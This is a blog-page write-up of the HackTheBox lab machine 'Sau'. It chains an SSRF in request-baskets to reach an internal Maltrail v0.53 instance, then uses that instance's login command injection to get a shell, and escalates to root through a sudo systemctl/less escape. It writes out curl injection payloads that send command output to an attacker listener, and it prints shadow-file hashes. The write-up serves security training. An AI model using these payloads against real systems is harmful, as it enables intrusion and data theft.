@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+  <meta name="google-site-verification" content="7KJy1PzJiembrfrHhOlsbL_CYSr-zHARDD6xkKA5S8I" />
+
+  <title>Sau [HackTheBox]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Sau [HackTheBox] | Alikraken’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Sau [HackTheBox]" />
+<meta name="author" content="Alikraken" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A shopping basket?" />
+<meta property="og:description" content="A shopping basket?" />
+<link rel="canonical" href="http://localhost:8000/hackthebox-sau" />
+<meta property="og:url" content="http://localhost:8000/hackthebox-sau" />
+<meta property="og:site_name" content="Alikraken’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-07-23T00:00:00+06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Sau [HackTheBox]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Alikraken","url":"https://kanin9.github.io/"},"dateModified":"2023-07-23T00:00:00+06:00","datePublished":"2023-07-23T00:00:00+06:00","description":"A shopping basket?","headline":"Sau [HackTheBox]","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/hackthebox-sau"},"url":"http://localhost:8000/hackthebox-sau"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-X6HLB9WBLS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-X6HLB9WBLS');
+</script>
+
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>alikraken@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Sau [HackTheBox]</h2>
+  <time datetime="2023-07-23T00:00:00+06:00" class="by-line">23 Jul 2023</time>
+  <br><br> 
+  <span style="display: block;">[
+  
+    
+    <a href="/hackthebox-sau" style="text-decoration:none"><code class="highligher-rouge"><nobr>linux</nobr></code></a>
+  
+    
+    <a href="/hackthebox-sau" style="text-decoration:none"><code class="highligher-rouge"><nobr>htb</nobr></code></a>
+  
+  ]</span>
+  
+  <p><em>A shopping basket?</em></p>
+
+<h2 id="recon">Recon</h2>
+
+<p>Running nmap full scan have shown three running services</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE    SERVICE        VERSION
+22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
+|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
+|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
+80/tcp    filtered http
+55555/tcp open unknown
+</code></pre></div></div>
+
+<p>At first, my instusive thoughts had nagged me to visit http/80 but I got no response, so I switched to the other web service and received this</p>
+
+<p><img src="assets/new-basket-sau-2023-07-23.png" alt="image" /></p>
+
+<p>A webhook creation service powered by <a href="https://github.com/darklynx/request-baskets">request-baskets</a>, which also appears to be outdated, running on version <strong>1.2.1</strong>.</p>
+
+<h2 id="finding-a-vulnerability">Finding a vulnerability</h2>
+
+<p>Request Baskets has a wonderful feature that allows a user to forward a URL from a hook. You guessed it, this is a SSRF. That means we could finally get a response from internal web service running on port 80.</p>
+
+<p><img src="assets/ssrf-sau-2023-07-23.png" alt="ssrf" /></p>
+
+<p>Applying new configuration and visiting the hook gets us this ugly looking leftover of a page.</p>
+
+<p><img src="assets/mailtrail-sau-2023-07-23.png" alt="mailtrail" /></p>
+
+<p>Since nothing on this page is interactable besides hyperlinks it would be a good idea to check them out. Lets look for vulnerabilities for the running version of Maltrail (v0.53). Opening <code class="language-plaintext highlighter-rouge">CHANGELOG.md</code> on github <a href="https://github.com/stamparm/maltrail">project page</a> we can spot that v0.53 has an OS command injection vulnerability to abuse. That is a good start.</p>
+
+<p><img src="assets/changelog-sau-2023-07-23.png" alt="changelog" /></p>
+
+<p>Following the trail we get to this <a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">page</a> containing POC.</p>
+
+<p>It is straightforward from here how to get an actual user flag. Changing forward URL of our webhook to <code class="language-plaintext highlighter-rouge">http://127.0.0.1:80/login</code> and chaining curl command we get this payload</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.11.224:55555/o59waz0 --data 'username=;`curl 10.10.14.33:1337 --data $(whoami)`'
+curl http://10.10.11.224:55555/o59waz0 --data 'username=;`curl 10.10.14.33:1337 --data $(cat /home/puma/user.txt)`'
+</code></pre></div></div>
+
+<p>Running it makes netcat receive the user flag: <strong>925de45f95916d0511f7XXXXXXXXXXXX</strong></p>
+
+<h2 id="getting-the-root-user">Getting the root user</h2>
+
+<p>Now off to the hard part. Using python reverse shell code we get an access to the system under a <code class="language-plaintext highlighter-rouge">puma</code> user.</p>
+
+<p>Checking sudo commands via <code class="language-plaintext highlighter-rouge">sudo -l</code> gives us</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+</span></code></pre></div></div>
+
+<p>Bingo. No password sudo command. If we run it we get a <code class="language-plaintext highlighter-rouge">less</code> output of a Maltrail log. If you did not know, less can be <a href="https://gtfobins.github.io/gtfobins/less/">abused</a> to break out of restricted environments. Typing <code class="language-plaintext highlighter-rouge">!/bin/sh</code> in a less prompt got me a root shell, thus bringing me to the final flag: <strong>05bdb094a8b2d5443XXXXXXXXXXXXXXX</strong></p>
+
+<h2 id="shadow-file">Shadow file</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:$6$4IguUssRBYl3/LvG$MfnFD1Y9saTrvw2OqA1VtqKxa7TsDt1kb2qsJw6inQ8GfmnqIrh32eqk9IMO4UR3fYG.TzbJeiFd7UOu1QlGR0:19461:0:99999:7:::
+puma:$6$eB4LwfQg7IgQC38d$SktdHbU0gQAh0.BoRY36FHreH6xR073oHdRrk6hmvar4eZTnmkfxbUxsMBsaZMRm9XHYQF9hG4l5v6fefYdic/:19461:0:99999:7:::
+</code></pre></div></div>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Chaining exploits can be an effective way to create an ultimately stronger attack, as proven in this machine. Although, try to not be carried away by trying to fit every piece of the puzzle.</p>
+
+
+</article>
+
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Alikraken</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
